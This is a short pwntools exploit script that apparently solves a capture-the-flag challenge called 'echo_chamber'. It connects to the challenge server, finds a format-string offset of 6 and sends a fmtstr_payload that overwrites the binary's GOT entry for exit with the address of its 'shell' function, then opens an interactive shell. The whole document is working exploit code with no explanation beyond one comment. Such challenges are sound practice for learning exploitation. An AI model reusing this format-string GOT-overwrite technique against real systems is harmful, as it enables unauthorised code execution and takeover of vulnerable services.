from pwn import *
context.log_level='debug'
elf = context.binary = ELF("./echo_chamber")
p = connect("chals.cyberthon22t.ctf.sg", 20301)

GOT_exit = elf.got['exit']
shell = elf.symbols['shell']
write = {elf.got['exit']:elf.symbols['shell']}

p.recvuntil("=> ")

# --- Testing offset ---
#fstring = "AAAAA " + "%x "*8
#p.sendline(fstring)
# you can see that the 6th leak has been replaced by 4141 which is hex for AA

offset = 6

payload = flat(
	fmtstr_payload(offset, write)
)

p.sendline(payload)
p.interactive()

